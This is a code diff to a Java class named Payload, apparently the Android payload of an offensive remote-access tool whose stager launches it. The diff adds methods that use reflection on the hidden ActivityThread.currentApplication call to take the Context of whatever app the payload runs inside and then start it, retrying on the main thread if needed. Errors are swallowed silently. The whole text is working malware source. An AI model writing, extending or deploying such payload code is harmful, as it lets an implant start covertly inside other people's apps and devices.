@@ -5,6 +5,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.PowerManager;
 
 import java.io.ByteArrayOutputStream;
@@ -14,6 +16,7 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.lang.reflect.Method;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
@@ -44,6 +47,42 @@ public class Payload {
     public static void start(Context context) {
         Payload.context = context;
         startInPath(context.getFilesDir().toString());
+    }
+
+    public static void startContext() {
+        try {
+            findContext();
+        } catch (Exception e) {
+        }
+    }
+
+    private static void findContext() throws Exception {
+        Class<?> activityThreadClass;
+        try {
+            activityThreadClass = Class.forName("android.app.ActivityThread");
+        } catch (ClassNotFoundException e) {
+            // No context
+            return;
+        }
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+        if (context == null) {
+            // Post to the UI/Main thread and try and retrieve the Context
+            final Handler handler = new Handler(Looper.getMainLooper());
+            handler.post(new Runnable() {
+                public void run() {
+                    try {
+                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+                        if (context != null) {
+                            start(context);
+                        }
+                    } catch (Exception e) {
+                    }
+                }
+            });
+        } else {
+            start(context);
+        }
     }
 
     // Launched from ndk stager
